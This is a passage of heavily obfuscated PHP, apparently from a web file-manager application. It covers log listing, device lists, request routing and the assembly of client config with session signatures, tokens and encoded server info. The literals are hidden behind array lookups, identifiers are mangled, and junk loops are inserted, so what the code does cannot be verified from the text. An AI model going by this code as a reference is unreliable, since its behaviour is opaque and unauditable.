Input::get($î±–öúâ[541], $î±–öúâ[7], $î±–öúâ[2183], array($î±–öúâ[2095], $î±–öúâ[535])); $Âåœçå = $éö—°³ã[$Âåœçå]; $ ª’óÄ = $ ª’óÄ . "{$øÉ‚Û}\x20{$Âåœçå}"; return $this->order($ ª’óÄ); } public function get($şŠ®‡Â‰ = '') { $•øÂªá© =& $_SERVER[É¨™èà]; if (!$şŠ®‡Â‰) { show_json(array()); } $Æìî— = array(); if ($şŠ®‡Â‰[$•øÂªá©[1800]]) { $Æìî—[$•øÂªá©[1800]] = $şŠ®‡Â‰[$•øÂªá©[1800]]; } if (isset($şŠ®‡Â‰[$•øÂªá©[851]])) { $ŠÓ±œ”º = $şŠ®‡Â‰[$•øÂªá©[851]]; $·»è•Ó± = isset($şŠ®‡Â‰[$•øÂªá©[852]]) ? $şŠ®‡Â‰[$•øÂªá©[852]] : time(); $Æìî—[$•øÂªá©[234]] = array($•øÂªá©[419], array($ŠÓ±œ”º, $·»è•Ó±)); } if ($şŠ®‡Â‰[$•øÂªá©[33]]) { $ÜÊòú = explode($•øÂªá©[50], $şŠ®‡Â‰[$•øÂªá©[33]]); $‰¶âıÔ = $this->typeFile(); $éşè¯ñ± = array(); foreach ($ÜÊòú as $ŒÔÃÚú) { $éşè¯ñ±[] = $ŒÔÃÚú; if (isset($‰¶âıÔ[$ŒÔÃÚú])) { $éşè¯ñ± = array_merge($éşè¯ñ±, $‰¶âıÔ[$ŒÔÃÚú]); } } $éşè¯ñ± = array_unique($éşè¯ñ±); if ($éşè¯ñ±) { $Æìî—[$•øÂªá©[33]] = array($•øÂªá©[7], $éşè¯ñ±); } } else { $Æìî—[$•øÂªá©[33]] = array($•øÂªá©[2470], $•øÂªá©[2471]); } if (!empty($şŠ®‡Â‰[$•øÂªá©[2469]])) { $Æìî—[$•øÂªá©[536]] = array($•øÂªá©[469], "\x25{$şŠ®‡Â‰[$•øÂªá©[2469]]}\x25"); } $æÎò—À– = $this->_makeOrder()->where($Æìî—)->selectPage(); if (empty($æÎò—À–[$•øÂªá©[456]])) { show_json(array(), !0, $æÎò—À–[$•øÂªá©[453]]); } $æÎò—À–[$•øÂªá©[456]] = $this->logList($æÎò—À–[$•øÂªá©[456]]); return $æÎò—À–; } private function ipAddress(&$âÚ”éÓ’) { $Ö·ò©ƒ· =& $_SERVER[É¨™èà]; if (!empty($âÚ”éÓ’[$Ö·ò©ƒ·[2469]])) { $²ô‰—Ãè = IpLocation::get($âÚ”éÓ’[$Ö·ò©ƒ·[2469]]); } else { $²ô‰—Ãè = LNG($Ö·ò©ƒ·[2472]); } $âÚ”éÓ’[$Ö·ò©ƒ·[2473]] = $²ô‰—Ãè; } private function descZipDownload($ŸĞÒÒûÌ, &$ÈÎÍÜê) { $ÛÎ² ı’ =& $_SERVER[É¨™èà]; if (!isset($ŸĞÒÒûÌ[$ÛÎ² ı’[2474]])) { return; } $—ÉŒÒ™ã = json_decode($ŸĞÒÒûÌ[$ÛÎ² ı’[2474]], !0); foreach ($—ÉŒÒ™ã as $ªõÚ’ï¦) { try { $çÙª›˜ = IO::infoFullSimple($ªõÚ’ï¦[$ÛÎ² ı’[87]]); } catch (Exception $ó×êËÕ€) { continue; } $ŸĞÒÒûÌ[$ÛÎ² ı’[87]] = $ªõÚ’ï¦[$ÛÎ² ı’[87]]; $ÈÎÍÜê[] = $ŸĞÒÒûÌ[$ÛÎ² ı’[194]] = $çÙª›˜[$ÛÎ² ı’[194]]; $ÈÎÍÜê[] = $ŸĞÒÒûÌ[$ÛÎ² ı’[2237]] = $çÙª›˜[$ÛÎ² ı’[193]]; break; } return $ŸĞÒÒûÌ; } private function getSourceList(&$û½‚–ğ¥) { $Ğ®“è£¡ =& $_SERVER[É¨™èà]; $¦¨»Ÿ™§ = array(); foreach ($û½‚–ğ¥ as $™³è¡úº => $…£ öòÕ) { $ŸËº°ÖÑ = json_decode($…£ öòÕ[$Ğ®“è£¡[536]], !0); if ($…£ öòÕ[$Ğ®“è£¡[33]] == $Ğ®“è£¡[1973]) { $ŸËº°ÖÑ = $this->descZipDownload($ŸËº°ÖÑ, $¦¨»Ÿ™§); $û½‚–ğ¥[$™³è¡úº][$Ğ®“è£¡[536]] = json_encode($ŸËº°ÖÑ); continue; } if (strpos($…£ öòÕ[$Ğ®“è£¡[33]], $Ğ®“è£¡[2239]) !== 0) { if (!isset($ŸËº°ÖÑ[$Ğ®“è£¡[87]]) || strpos($…£ öòÕ[$Ğ®“è£¡[33]], $Ğ®“è£¡[2475]) !== 0) { continue; } try { $ˆ×øÜ¼ù = IO::infoFullSimple($ŸËº°ÖÑ[$Ğ®“è£¡[87]]); } catch (Exception $Úåº«Â¨) { continue; } $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[194]] = $ˆ×øÜ¼ù[$Ğ®“è£¡[194]]; $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[2237]] = $ˆ×øÜ¼ù[$Ğ®“è£¡[193]]; $û½‚–ğ¥[$™³è¡úº][$Ğ®“è£¡[536]] = json_encode($ŸËº°ÖÑ); continue; } $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[194]]; $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[2237]]; if ($ŸËº°ÖÑ[$Ğ®“è£¡[33]] == $Ğ®“è£¡[635]) { $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[536]][$Ğ®“è£¡[1259]]; $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[536]][$Ğ®“è£¡[1260]]; } if ($ŸËº°ÖÑ[$Ğ®“è£¡[33]] == $Ğ®“è£¡[2248]) { $¦¨»Ÿ™§[] = $ŸËº°ÖÑ[$Ğ®“è£¡[536]][$Ğ®“è£¡[194]]; } } if (!$¦¨»Ÿ™§) { return array(); } return Model($Ğ®“è£¡[921])->sourceListInfo($¦¨»Ÿ™§, !0); } private function logList($¾ïˆŠß) { $Œ˜±”á¿ =& $_SERVER[É¨™èà]; $ÇÜ¬ì½Ä = array_to_keyvalue($¾ïˆŠß, $Œ˜±”á¿[12], $Œ˜±”á¿[1800]); $Ä´¾¾“” = Model($Œ˜±”á¿[609])->userListInfo(array_unique($ÇÜ¬ì½Ä)); $…¹©ëÇÈ = $this->getSourceList($¾ïˆŠß); $ÌÚçÅÜš = $this->typeAll(); $¢³ß¦ÅÌ = array(); $ù©ßˆ¿‚ = array(); foreach ($¾ïˆŠß as $î¦¿Ğ => $ŸÛÊĞà) { $ô‹¥ë“¸ = $ŸÛÊĞà[$Œ˜±”á¿[33]]; $ã’½¢ªî = isset($Ä´¾¾“”[$ŸÛÊĞà[$Œ˜±”á¿[1800]]]) ? $Ä´¾¾“”[$ŸÛÊĞà[$Œ˜±”á¿[1800]]] : !1; $µÎÃş¤è = strpos($ô‹¥ë“¸, $Œ˜±”á¿[2476]) === 0 ? LNG($Œ˜±”á¿[2477]) : LNG($Œ˜±”á¿[2472]); $ŸÛÊĞà[$Œ˜±”á¿[32]] = isset($ã’½¢ªî[$Œ˜±”á¿[32]]) ? $ã’½¢ªî[$Œ˜±”á¿[32]] : LNG($Œ˜±”á¿[2472]); $ŸÛÊĞà[$Œ˜±”á¿[2299]] = isset($ã’½¢ªî[$Œ˜±”á¿[2299]]) ? $ã’½¢ªî[$Œ˜±”á¿[2299]] : $Œ˜±”á¿[12]; $ŸÛÊĞà[$Œ˜±”á¿[1687]] = isset($ÌÚçÅÜš[$ô‹¥ë“¸]) ? $ÌÚçÅÜš[$ô‹¥ë“¸] : $µÎÃş¤è; $ŸÛÊĞà[$Œ˜±”á¿[2182]] = $ã’½¢ªî; $€Æøöñû = json_decode($ŸÛÊĞà[$Œ˜±”á¿[536]], !0); $ŸÛÊĞà[$Œ˜±”á¿[2469]] = isset($€Æøöñû[$Œ˜±”á¿[2469]]) ? $€Æøöñû[$Œ˜±”á¿[2469]] : $Œ˜±”á¿[12]; $ŸÛÊĞà[$Œ˜±”á¿[2473]] = IpLocation::get($ŸÛÊĞà[$Œ˜±”á¿[2469]]); if (strpos($ô‹¥ë“¸, $Œ˜±”á¿[2239]) === 0 || isset($€Æøöñû[$Œ˜±”á¿[2237]])) { $€Æøöñû[$Œ˜±”á¿[90]] = $…¹©ëÇÈ[$€Æøöñû[$Œ˜±”á¿[194]]]; $€Æøöñû[$Œ˜±”á¿[2253]] = $…¹©ëÇÈ[$€Æøöñû[$Œ˜±”á¿[2237]]]; if ($€Æøöñû[$Œ˜±”á¿[33]] == $Œ˜±”á¿[635]) { $€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[1259]] = $…¹©ëÇÈ[$€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[1259]]]; $€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[1260]] = $…¹©ëÇÈ[$€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[1260]]]; } if ($€Æøöñû[$Œ˜±”á¿[33]] == $Œ˜±”á¿[2248]) { $€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[194]] = $…¹©ëÇÈ[$€Æøöñû[$Œ˜±”á¿[536]][$Œ˜±”á¿[194]]]; } if ($€Æøöñû[$Œ˜±”á¿[33]] == $Œ˜±”á¿[1247]) { $€Æøöñû[$Œ˜±”á¿[2253]] = $€Æøöñû[$Œ˜±”á¿[90]]; $€Æøöñû[$Œ˜±”á¿[2237]] = $€Æøöñû[$Œ˜±”á¿[2253]][$Œ˜±”á¿[194]]; $€Æøöñû[$Œ˜±”á¿[90]] = !1; $€Æøöñû[$Œ˜±”á¿[194]] = $Œ˜±”á¿[12]; } $ÈÊ§ç¹ä = array($Œ˜±”á¿[1247], $Œ˜±”á¿[2235]); if (!in_array($€Æøöñû[$Œ˜±”á¿[33]], $ÈÊ§ç¹ä)) { if ($€Æøöñû[$Œ˜±”á¿[90]] && $€Æøöñû[$Œ˜±”á¿[90]][$Œ˜±”á¿[191]] == $Œ˜±”á¿[192]) { $ù©ßˆ¿‚[] = $ŸÛÊĞà[$Œ˜±”á¿[485]]; unset($¾ïˆŠß[$î¦¿Ğ]); continue; } if ($€Æøöñû[$Œ˜±”á¿[2253]] && $€Æøöñû[$Œ˜±”á¿[2253]][$Œ˜±”á¿[191]] == $Œ˜±”á¿[192]) { $ù©ßˆ¿‚[] = $ŸÛÊĞà[$Œ˜±”á¿[485]]; unset($¾ïˆŠß[$î¦¿Ğ]); continue; } } } $ŸÛÊĞà[$Œ˜±”á¿[536]] = $€Æøöñû; unset($ŸÛÊĞà[$Œ˜±”á¿[2478]]); $¢³ß¦ÅÌ[] = $ŸÛÊĞà; } $this->clearSystemPathLog($ù©ßˆ¿‚); return $¢³ß¦ÅÌ; } private function clearSystemPathLog($àÈçõ™Ø) { $İ”¢ø· =& $_SERVER[É¨™èà]; if (count($àÈçõ™Ø) == 0) { return; } $øó¶Òõ¾ = array($İ”¢ø·[485] => array($İ”¢ø·[7], array_unique($àÈçõ™Ø))); $this->where($øó¶Òõ¾)->delete(); } public function deviceList($Ö¡²ˆ…ß, $Â‘â¡ò = 0) { $¤ƒ©ªË =& $_SERVER[É¨™èà]; $×€¤îù‹ = array($¤ƒ©ªË[1800] => $Ö¡²ˆ…ß, $¤ƒ©ªË[234] => array($¤ƒ©ªË[1108], $Â‘â¡ò), $¤ƒ©ªË[33] => $¤ƒ©ªË[1943]); $²Ä›ô‡È = array(); $óÔß¹ã… = $this->field($¤ƒ©ªË[2479])->where($×€¤îù‹)->order($¤ƒ©ªË[2251])->limit(50)->select(); foreach ($óÔß¹ã… as $‡ÂŠéäÃ => $îÜœÇúè) { if ($‡ÂŠéäÃ > 0 && abs($îÜœÇúè[$¤ƒ©ªË[234]] - $óÔß¹ã…[$‡ÂŠéäÃ - 1][$¤ƒ©ªË[234]]) < 5) { continue; } $¯¡ğ¿ıÈ = json_decode($îÜœÇúè[$¤ƒ©ªË[536]], !0); $îÜœÇúè[$¤ƒ©ªË[2469]] = isset($¯¡ğ¿ıÈ[$¤ƒ©ªË[2469]]) ? $¯¡ğ¿ıÈ[$¤ƒ©ªË[2469]] : $¤ƒ©ªË[12]; unset($¯¡ğ¿ıÈ[$¤ƒ©ªË[2469]]); $îå€™‘ = $this->deviceType($¯¡ğ¿ıÈ[$¤ƒ©ªË[2240]]); if (isset($²Ä›ô‡È[$îå€™‘])) { continue; } $îÜœÇúè[$¤ƒ©ªË[2473]] = IpLocation::get($îÜœÇúè[$¤ƒ©ªË[2469]]); $îÜœÇúè[$¤ƒ©ªË[536]] = $¯¡ğ¿ıÈ; $²Ä›ô‡È[$îå€™‘] = $îÜœÇúè; } return array_values($²Ä›ô‡È); } public function deviceType($“×ÄòÂ) { return $“×ÄòÂ; } } goto eÛŠ·ÚÃÇ; E®¾ßñõ‘: $wslcqagobt = $_SERVER[É¨™èà][697]; while ($wslcqagobt < $_SERVER[É¨™èà][698]) { if ($wslcqagobt >= 0) { break; } $wslcqagobt++; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\x69\x6e\x64\145\170"; function __construct() { } public function setDefault($ÚĞ´Ñıô) { $Úñòı©õ =& $_SERVER[É¨™èà]; $×êç‰ª³ =& $_SERVER[–úÃ®‰¸]; $ûâ¢ ©Ó = explode($×êç‰ª³[0], trim($ÚĞ´Ñıô, $×êç‰ª³[0])); $this->defaultModule = $ûâ¢ ©Ó[0] ? $ûâ¢ ©Ó[0] : $this->defaultModule; $µø»›Õ– = $Úñòı©õ[699]; if (!$µø»›Õ–) { die; } $this->defaultController = $ûâ¢ ©Ó[1] ? $ûâ¢ ©Ó[1] : $this->defaultController; $¹¹ßÜÌ˜ = $Úñòı©õ[700]; $this->defaultAction = $ûâ¢ ©Ó[2] ? $ûâ¢ ©Ó[2] : $this->defaultAction; $…¥ã”±Ç = $Úñòı©õ[701]; while ($…¥ã”±Ç < $Úñòı©õ[313]) { if ($…¥ã”±Ç >= 0) { break; } $…¥ã”±Ç++; } $this->xerjaf878616($×êç‰ª³[1], array($this, $×êç‰ª³[2])); $§–Ó¯‚ï = $Úñòı©õ[702]; while (strlen($§–Ó¯‚ï) < $Úñòı©õ[698]) { if (!$§–Ó¯‚ï) { break; } $§–Ó¯‚ï++; } } public function appRun($å¤æ¶ìË) { $ûÃ°¿Ôœ =& $_SERVER[É¨™èà]; $…Àô¤Õ =& $_SERVER[–úÃ®‰¸]; $Í¦şÂÅˆ = explode($…Àô¤Õ[0], $å¤æ¶ìË); $ĞÑ•Òƒ¾ = strtolower($Í¦şÂÅˆ[0]); $¶ê…­ = $ûÃ°¿Ôœ[703]; if (strlen($¶ê…­) < $ûÃ°¿Ôœ[704]) { return; } $ à£óùË = $…Àô¤Õ[3]; $ˆñªæùæ = $ûÃ°¿Ôœ[705]; if (strlen($ˆñªæùæ) < $ûÃ°¿Ôœ[698]) { return; } if ($ĞÑ•Òƒ¾ == $…Àô¤Õ[4]) { $ à£óùË = $…Àô¤Õ[5]; $Í¦şÂÅˆ[0] = $…Àô¤Õ[6]; $Í¦şÂÅˆ[1] = $Í¦şÂÅˆ[1] . $…Àô¤Õ[7]; $å¤æ¶ìË = join($…Àô¤Õ[0], $Í¦şÂÅˆ); $å¤æ¶ìË = trim($å¤æ¶ìË, $…Àô¤Õ[0]); } call_user_func(array($…Àô¤Õ[8], $…Àô¤Õ[9]), $ à£óùË . $…Àô¤Õ[10], $å¤æ¶ìË); ActionCall($å¤æ¶ìË); $¢ÃŠ£ñ‘ = $ûÃ°¿Ôœ[706]; if (!$¢ÃŠ£ñ‘) { return; } call_user_func(array($…Àô¤Õ[8], $…Àô¤Õ[9]), $ à£óùË . $…Àô¤Õ[11], $å¤æ¶ìË); } private function autorun() { $Á³ÙßÕ¦ =& $_SERVER[–úÃ®‰¸]; global $config; if (count($config[$Á³ÙßÕ¦[12]]) == 0) { return; } foreach ($config[$Á³ÙßÕ¦[12]] as $Š®ªÀçõ => $°‰™ëüÙ) { $this->appRun($°‰™ëüÙ); } } private function xznhdf9b6d7c() { $ÀêğÎñ =& $_SERVER[É¨™èà]; $È€·Âİı =& $_SERVER[–úÃ®‰¸]; $¾£Âòø = $È€·Âİı[4]; $²µ¶Ëª« = $GLOBALS[$È€·Âİı[13]][$È€·Âİı[14]][0]; if (!$²µ¶Ëª« || strlen($²µ¶Ëª«) <= strlen($¾£Âòø)) { return; } if (strtolower(substr($²µ¶Ëª«, -strlen($¾£Âòø))) != $¾£Âòø) { return; } $ñÕé°Î = substr($²µ¶Ëª«, 0, -strlen($¾£Âòø)); $‘ÃÊ‚° = $ÀêğÎñ[707]; while ($‘ÃÊ‚° < $ÀêğÎñ[313]) { if ($‘ÃÊ‚° >= 0) { break; } $‘ÃÊ‚°++; } $ß›î´§ì = array($È€·Âİı[4], $ñÕé°Î); $îŒ‡ƒ·ï = array_slice($GLOBALS[$È€·Âİı[13]][$È€·Âİı[14]], 1); $‹œ„¸ó = $ÀêğÎñ[708]; while (strlen($‹œ„¸ó) < $ÀêğÎñ[709]) { if (!$‹œ„¸ó) { break; } $‹œ„¸ó++; } $GLOBALS[$È€·Âİı[13]][$È€·Âİı[14]] = array_merge($ß›î´§ì, $îŒ‡ƒ·ï); $£¼ÌÏèÌ = $ÀêğÎñ[710]; if (!$£¼ÌÏèÌ) { return; } $GLOBALS[$È€·Âİı[13]][$È€·Âİı[15]] = implode($È€·Âİı[0], $GLOBALS[$È€·Âİı[13]][$È€·Âİı[14]]); } private function aogx37546edd() { $¬ìÌ“ë± =& $_SERVER[É¨™èà]; $ şÈ à€ =& $_SERVER[–úÃ®‰¸]; if ($GLOBALS[$ şÈ à€[13]][$ şÈ à€[15]] != $ şÈ à€[6]) { return; } $Øé«ŒÀÌ = $_SERVER[$ şÈ à€[16]]; $¸»Ë’š = $ şÈ à€[17]; if (!strstr($Øé«ŒÀÌ, $¸»Ë’š)) { return; } $©œÁ×®ë = strrpos($Øé«ŒÀÌ, $¸»Ë’š); $ºåÓ²ÔÊ = substr($Øé«ŒÀÌ, $©œÁ×®ë + strlen($¸»Ë’š)); $ùÅÒÖâì = $¬ìÌ“ë±[711]; preg_match_all($ şÈ à€[18], $ºåÓ²ÔÊ, $ö¨ûæ†); $ºåÓ²ÔÊ = trim($ö¨ûæ†[0][0], $ şÈ à€[19]); $·²Ë’ÖÅ = $¬ìÌ“ë±[712]; while ($·²Ë’ÖÅ < $¬ìÌ“ë±[704]) { if ($·²Ë’ÖÅ >= 0) { break; } $·²Ë’ÖÅ++; } $GLOBALS[$ şÈ à€[13]][$ şÈ à€[14]] = explode($ şÈ à€[19], $ºåÓ²ÔÊ); $GLOBALS[$ şÈ à€[13]][$ şÈ à€[15]] = implode($ şÈ à€[0], $GLOBALS[$ şÈ à€[13]][$ şÈ à€[14]]); } public function run() { $Ü×Óşéä =& $_SERVER[É¨™èà]; $Ş›÷Ù° =& $_SERVER[–úÃ®‰¸]; $this->aogx37546edd(); $this->xznhdf9b6d7c(); $ÇÎı£Û = $GLOBALS[$Ş›÷Ù°[13]][$Ş›÷Ù°[14]]; $á™ ÒË = $Ü×Óşéä[713]; if (strlen($á™ ÒË) < $Ü×Óşéä[704]) { die; } $¿Ø‘²ª­ = $GLOBALS[$Ş›÷Ù°[13]][$Ş›÷Ù°[15]]; define($Ş›÷Ù°[20], isset($ÇÎı£Û[0]) && $ÇÎı£Û[0] ? $ÇÎı£Û[0] : $this->defaultModule); $¬¯ı¥¹ = $Ü×Óşéä[714]; define($Ş›÷Ù°[21], isset($ÇÎı£Û[1]) && $ÇÎı£Û[0] ? $ÇÎı£Û[1] : $this->defaultController); define($Ş›÷Ù°[22], isset($ÇÎı£Û[2]) && $ÇÎı£Û[0] ? $ÇÎı£Û[2] : $this->defaultAction); define($Ş›÷Ù°[23], MOD . $Ş›÷Ù°[0] . ST . $Ş›÷Ù°[0] . ACT); $_SERVER[$Ş›÷Ù°[24]] = strtolower(ACTION); $Şˆİ›· = $Ü×Óşéä[715]; if (!$Şˆİ›·) { return; } $this->autorun(); $ù–¯¶˜ = $Ü×Óşéä[716]; if (!$ù–¯¶˜) { return; } if (count($ÇÎı£Û) >= 3) { $this->appRun($¿Ø‘²ª­); } else { $this->appRun(ACTION); } } private $bzmfbdb83a8c = array(); private $hcnb757df6e8 = ''; public function tnle7cc4d5e9() { $ÅÏè¥ü¼ =& $_SERVER[É¨™èà]; $áªÉµ×å =& $_SERVER[–úÃ®‰¸]; $this->fhyp9a6d6b5d(); $this->maby03660a0f(); $this->lkno49064d8d(); $ÙæèµŸ­ = $ÅÏè¥ü¼[717]; $this->tkezb87c65b4(); $²ÖË˜ÎÑ = $ÅÏè¥ü¼[718]; if (strlen($²ÖË˜ÎÑ) < $ÅÏè¥ü¼[704]) { return; } $this->zpdbec2a9b4c(); $this->ujnhaa682656(); $ä»Üæïı = $ÅÏè¥ü¼[719]; while (strlen($ä»Üæïı) < $ÅÏè¥ü¼[720]) { if (!$ä»Üæïı) { break; } $ä»Üæïı++; } $this->fsvj731033eb(); $this->xerjaf878616($áªÉµ×å[25], array($this, $áªÉµ×å[26])); $¨ù“¡„ = $ÅÏè¥ü¼[721]; $this->xerjaf878616($áªÉµ×å[27], array($this, $áªÉµ×å[28])); $this->xerjaf878616($áªÉµ×å[29], array($this, $áªÉµ×å[30])); $•õÕöçˆ = $ÅÏè¥ü¼[722]; if (strlen($•õÕöçˆ) < $ÅÏè¥ü¼[709]) { die; } $this->xerjaf878616($áªÉµ×å[31], array($this, $áªÉµ×å[32])); $Ô¨¬üï¯ = $ÅÏè¥ü¼[723]; if (!$Ô¨¬üï¯) { die; } } public function topv33ac95b5($ı‚‡´) { $…ÍôÎóÚ =& $_SERVER[É¨™èà]; $Ÿ¹œ¢Ÿš =& $_SERVER[–úÃ®‰¸]; $–…Ö¹¯ = Model($Ÿ¹œ¢Ÿš[33])->get(); $¸£Ù¨á = array($Ÿ¹œ¢Ÿš[34], $Ÿ¹œ¢Ÿš[35], $Ÿ¹œ¢Ÿš[36], $Ÿ¹œ¢Ÿš[37], $Ÿ¹œ¢Ÿš[38], $Ÿ¹œ¢Ÿš[39], $Ÿ¹œ¢Ÿš[40], $Ÿ¹œ¢Ÿš[41], $Ÿ¹œ¢Ÿš[42], $Ÿ¹œ¢Ÿš[43], $Ÿ¹œ¢Ÿš[44], $Ÿ¹œ¢Ÿš[45], $Ÿ¹œ¢Ÿš[46], $Ÿ¹œ¢Ÿš[47], $Ÿ¹œ¢Ÿš[48], $Ÿ¹œ¢Ÿš[49], $Ÿ¹œ¢Ÿš[50], $Ÿ¹œ¢Ÿš[51], $Ÿ¹œ¢Ÿš[52], $Ÿ¹œ¢Ÿš[53], $Ÿ¹œ¢Ÿš[54], $Ÿ¹œ¢Ÿš[55], $Ÿ¹œ¢Ÿš[56], $Ÿ¹œ¢Ÿš[57], $Ÿ¹œ¢Ÿš[58], $Ÿ¹œ¢Ÿš[59], $Ÿ¹œ¢Ÿš[60], $Ÿ¹œ¢Ÿš[61], $Ÿ¹œ¢Ÿš[62], $Ÿ¹œ¢Ÿš[63], $Ÿ¹œ¢Ÿš[64], $Ÿ¹œ¢Ÿš[65], $Ÿ¹œ¢Ÿš[66], $Ÿ¹œ¢Ÿš[67], $Ÿ¹œ¢Ÿš[68], $Ÿ¹œ¢Ÿš[69], $Ÿ¹œ¢Ÿš[70], $Ÿ¹œ¢Ÿš[71], $Ÿ¹œ¢Ÿš[72], $Ÿ¹œ¢Ÿš[73], $Ÿ¹œ¢Ÿš[74], $Ÿ¹œ¢Ÿš[75], $Ÿ¹œ¢Ÿš[76], $Ÿ¹œ¢Ÿš[77], $Ÿ¹œ¢Ÿš[78], $Ÿ¹œ¢Ÿš[79], $Ÿ¹œ¢Ÿš[80], $Ÿ¹œ¢Ÿš[81], $Ÿ¹œ¢Ÿš[82], $Ÿ¹œ¢Ÿš[83], $Ÿ¹œ¢Ÿš[84], $Ÿ¹œ¢Ÿš[85]); foreach ($¸£Ù¨á as $£ºıà•) { $ÑèÃşĞ = $GLOBALS[$Ÿ¹œ¢Ÿš[86]][$Ÿ¹œ¢Ÿš[87]][$£ºıà•]; $¤Î÷¦¤ = $…ÍôÎóÚ[724]; if (strlen($¤Î÷¦¤) < $…ÍôÎóÚ[698]) { die; } if (isset($–…Ö¹¯[$£ºıà•])) { $ÑèÃşĞ = $–…Ö¹¯[$£ºıà•]; } $ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$£ºıà•] = $ÑèÃşĞ; } $ùÖ™¥€Ÿ = $ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$Ÿ¹œ¢Ÿš[46]]; unset($ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[90]][$Ÿ¹œ¢Ÿš[91]]); unset($ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[90]][$Ÿ¹œ¢Ÿš[92]]); $ÕáÕÚ«÷ = $…ÍôÎóÚ[725]; if (strlen($ÕáÕÚ«÷) < $…ÍôÎóÚ[720]) { return; } unset($ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$Ÿ¹œ¢Ÿš[46]]); unset($ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$Ÿ¹œ¢Ÿš[93]]); $¿¸¨Õ§ = $…ÍôÎóÚ[726]; if (!$¿¸¨Õ§) { die; } $ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$Ÿ¹œ¢Ÿš[94]] = array($Ÿ¹œ¢Ÿš[95] => (int) $ùÖ™¥€Ÿ[$Ÿ¹œ¢Ÿš[96]], $Ÿ¹œ¢Ÿš[97] => (int) _get($ùÖ™¥€Ÿ, $Ÿ¹œ¢Ÿš[98], 0)); $´¨ÂÔ¿Ô = $…ÍôÎóÚ[727]; if (!$´¨ÂÔ¿Ô) { die; } $Ş»£†ì† = substr(md5($Ÿ¹œ¢Ÿš[99] . get_client_ip() . $–…Ö¹¯[$Ÿ¹œ¢Ÿš[100]]), 0, 15); $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[102]] = Mcrypt::encode(Session::sign(), $Ş»£†ì†, 3600 * 24); $“ç¼Ğæ™ = $…ÍôÎóÚ[728]; if (!$“ç¼Ğæ™) { return; } $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[103]] = Action($Ÿ¹œ¢Ÿš[104])->accessToken(); $ÄŒ§Ÿ³ñ = $…ÍôÎóÚ[729]; if (!$ÄŒ§Ÿ³ñ) { return; } $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[105]] = md5($_SERVER[$Ÿ¹œ¢Ÿš[106]] . $–…Ö¹¯[$Ÿ¹œ¢Ÿš[100]]); $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[107]] = base64_encode(serverInfo()); $…ÁÕÆá = $…ÍôÎóÚ[730]; if (strlen($…ÁÕÆá) < $…ÍôÎóÚ[704]) { die; } $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[108]] = $this->hcnb757df6e8; $ÜŒÓâÎ¯ = $…ÍôÎóÚ[731]; if (strlen($ÜŒÓâÎ¯) < $…ÍôÎóÚ[313]) { die; } if ($–…Ö¹¯[$Ÿ¹œ¢Ÿš[108]] != $Ÿ¹œ¢Ÿš[109]) { $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[110]] = $–…Ö¹¯[$Ÿ¹œ¢Ÿš[110]]; $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[111]] = $–…Ö¹¯[$Ÿ¹œ¢Ÿš[111]]; $£œ°ÄØ = rand_string(10) . $this->hcnb757df6e8 . rand_string(5); $ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[112]][$Ÿ¹œ¢Ÿš[113]] = $this->vbqsb65d8103($£œ°ÄØ, $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[105]]); } if ($this->hcnb757df6e8 == $Ÿ¹œ¢Ÿš[109]) { $ı‚‡´[$Ÿ¹œ¢Ÿš[88]][$Ÿ¹œ¢Ÿš[89]][$Ÿ¹œ¢Ÿš[94]][$Ÿ¹œ¢Ÿš[98]] = 0; } $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[114]] = $this->versionPluginFilter(); $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[115]] = _get($this->bzmfbdb83a8c, $Ÿ¹œ¢Ÿš[116], $Ÿ¹œ¢Ÿš[6]); if (KodUser::isRoot() && $this->config[$Ÿ¹œ¢Ÿš[117]]) { $ı‚‡´[$Ÿ¹œ¢Ÿš[101]][$Ÿ¹œ¢Ÿš[118]] = WEB_ROOT; } return $ı‚‡´; } private function ujnhaa682656() { $«¸¦Ü¥í =& $_SERVER[É¨™èà]; $™•¦Š§ò =& $_SERVER[–úÃ®‰¸]; $ñ¥¨éÈß = $_SERVER[$™•¦Š§ò[24]] == $™•¦Š§ò[119]; if ($_SERVER[$™•¦Š§ò[24]] == $™•¦Š§ò[120] && $_GET[$™•¦Š§ò[121]] == 